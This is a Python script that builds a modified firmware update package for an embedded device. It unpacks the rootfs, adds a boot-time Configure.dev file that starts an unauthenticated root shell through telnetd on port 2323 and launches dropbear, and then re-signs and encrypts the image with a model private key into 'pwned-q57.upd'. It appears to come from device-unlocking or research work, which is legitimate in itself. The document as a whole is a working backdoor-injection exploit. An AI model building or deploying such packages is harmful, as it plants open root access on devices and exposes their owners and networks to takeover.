#!/usr/bin/env python3
"""Build the patched 57.23-74170-1-16 rootfs section for bead q57.

Payload (minimal, idempotent):
  /jffs/system/            (dir, so the write target exists without the device)
  /jffs/system/Configure.dev 0644  sh'd as root by rcS on every boot, and its
                                   mere existence makes /wifi/Configure start
                                   telnetd on 2323 and set the unlock flag
  /PWNED-MARKER           fixed string

Rootfs: squashfs 3.0, so mksquashfs 3.4 (squashfs3.4.tar.gz) is required; the
build runs it inside a Debian container. Command is exactly the documented one:
  mksquashfs /src /out -be -all-root -noappend -b 65536
then s_minor at 0x1e is restored from the base image (3.4 writes 3.1).

Envelope: `886499ca`, u32be header_len, u32be 0x10000, 8 zero bytes,
u8 recipient_len, u8 3, recipient, u32be 1, u32be rsa_len, RSA-OAEP(SHA-1) key,
u32be 1, u32be data_len (IV+ciphertext), 16-byte zero IV, AES-128-CBC/PKCS#7
body. The recipient is copied from the base package's own type-4 envelope, and
the key is the model16 private key. Everything outside section type 4 is left
untouched except the payload[8] revision byte, which is bumped by one.

Usage:
  build_rootfs.py --base-dir DIR [--work DIR] [--out DIR] [--key PEM] [--no-docker]

Outputs: rootfs-patched.bin, type4-envelope.bin, pwned-q57.upd, SHA256SUMS.
No device is touched.
"""
import argparse
import hashlib
import os
import shutil
import struct
import subprocess
import sys
import tempfile

MAGIC = b"\x49\x7f\x16\x35"
ENV = bytes.fromhex("886499ca")
REV_OFF = 0x18  # payload[8] of section 1: monotonic update revision

CFG = b"""#!/bin/sh
# /jffs/system/Configure.dev
/usr/sbin/telnetd -l /bin/sh -p 2323
/usr/sbin/dropbear -p 22 2>/dev/null
touch /tmp/device_unlocked_flag
"""
MARKER = b"frankensonos q57 patched rootfs - Configure.dev + telnetd 2323 + dropbear 22\n"
T = 1771344440  # base image creation time; pins mtimes for reproducible bytes


def sha(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for b in iter(lambda: f.read(1 << 20), b""):
            h.update(b)
    return h.hexdigest()


def sections(d):
    o = 0
    while o < len(d):
        if d[o:o + 4] != MAGIC:
            sys.exit("bad magic at 0x%x" % o)
        t, tot, _ = struct.unpack_from("<III", d, o + 4)
        yield t, o, tot
        o += tot


def read_recipient(d):
    for t, o, tot in sections(d):
        if t in (3, 4, 6):
            p = d[o + 16:o + tot]
            if p[:4] == ENV:
                n = p[0x14]
                return p[0x16:0x16 + n]
    sys.exit("no envelope to copy the recipient from")


def envelope(payload, key, recipient):
    td = tempfile.mkdtemp()
    try:
        aes = os.urandom(16)
        iv = b"\0" * 16
        raw = os.path.join(td, "r")
        open(raw, "wb").write(payload)
        wrapped = subprocess.run(
            ["openssl", "pkeyutl", "-encrypt", "-inkey", key,
             "-pkeyopt", "rsa_padding_mode:oaep", "-pkeyopt", "rsa_oaep_md:sha1",
             "-in", "/dev/stdin"],
            input=aes, capture_output=True, check=True).stdout
        ct = subprocess.run(
            ["openssl", "aes-128-cbc", "-e", "-K", aes.hex(), "-iv", iv.hex(),
             "-in", raw], capture_output=True, check=True).stdout
    finally:
        shutil.rmtree(td)
    head = (struct.pack(">I", 0x10000) + b"\0" * 8
            + bytes([len(recipient), 3]) + recipient
            + struct.pack(">I", 1) + struct.pack(">I", len(wrapped)) + wrapped
            + struct.pack(">I", 1) + struct.pack(">I", len(iv) + len(ct)))
    header_len = 4 + 4 + len(head)
    return ENV + struct.pack(">I", header_len) + head + iv + ct


def unsquash(image, dest):
    subprocess.run(["unsquashfs", "-f", "-d", dest, image], check=True,
                   stdout=subprocess.DEVNULL)


def squash(src, out, docker):
    if docker:
        cmd = ["docker", "run", "--rm", "-v", src + ":/src:ro",
               "-v", os.path.dirname(os.path.abspath(out)) + ":/out",
               "-v", "/tmp/squashfs3.4/squashfs-tools:/tools:ro",
               "debian:bookworm-slim",
               "/tools/mksquashfs", "/src", "/out/" + os.path.basename(out),
               "-be", "-all-root", "-noappend", "-b", "65536"]
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL)
    else:
        subprocess.run(["/tmp/squashfs3.4/squashfs-tools/mksquashfs", src, out,
                        "-be", "-all-root", "-noappend", "-b", "65536"],
                       check=True, stdout=subprocess.DEVNULL)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-dir", required=True)
    ap.add_argument("--work", default="/tmp/q57root")
    ap.add_argument("--out", default=".")
    ap.add_argument("--key", default=None)
    ap.add_argument("--no-docker", action="store_true")
    a = ap.parse_args()

    base_dir = os.path.abspath(a.base_dir)
    key = a.key or os.path.join(base_dir, "model16-private.pem")
    base_upd = os.path.join(base_dir, "57.23-74170-1-16.upd")
    base_bin = os.path.join(base_dir, "57.23-74170-1-16-rootfs.bin")
    out = os.path.abspath(a.out)
    os.makedirs(out, exist_ok=True)

    tree = a.work
    shutil.rmtree(tree, ignore_errors=True)
    unsquash(base_bin, tree)
    sysdir = os.path.join(tree, "jffs/system")
    os.makedirs(sysdir, exist_ok=True)
    p = os.path.join(sysdir, "Configure.dev")
    open(p, "wb").write(CFG)
    os.chmod(p, 0o644)
    m = os.path.join(tree, "PWNED-MARKER")
    open(m, "wb").write(MARKER)
    os.chmod(m, 0o644)
    for x in (sysdir, p, m, os.path.join(tree, "jffs")):
        os.utime(x, (T, T))

    bin_out = os.path.join(out, "rootfs-patched.bin")
    squash(tree, bin_out, not a.no_docker)
    img = bytearray(open(bin_out, "rb").read())
    orig = open(base_bin, "rb").read()
    if img[:4] != orig[:4] or img[0x1c:0x1e] != orig[0x1c:0x1e]:
        sys.exit("squashfs shape differs (magic/major) - refusing")
    img[0x1e:0x20] = orig[0x1e:0x20]  # 3.4 writes 3.1; force the base minor
    open(bin_out, "wb").write(img)

    d = bytearray(open(base_upd, "rb").read())
    d[REV_OFF] += 1
    t4 = next((o, tot) for t, o, tot in sections(d) if t == 4)
    env = envelope(bytes(img), key, read_recipient(d))
    open(os.path.join(out, "type4-envelope.bin"), "wb").write(env)
    o, tot = t4
    sec = MAGIC + struct.pack("<III", 4, 16 + len(env), 4) + env
    pkg = bytes(d[:o]) + sec + bytes(d[o + tot:])
    upd_out = os.path.join(out, "pwned-q57.upd")
    open(upd_out, "wb").write(pkg)

    sums = os.path.join(out, "SHA256SUMS")
    with open(sums, "w") as f:
        for name in ("rootfs-patched.bin", "type4-envelope.bin", "pwned-q57.upd"):
            f.write("%s  %s\n" % (sha(os.path.join(out, name)), name))
    print(open(sums).read(), end="")
    print("section4 at 0x%x, tot %d (was %d)" % (o, 16 + len(env), tot))


if __name__ == "__main__":
    main()
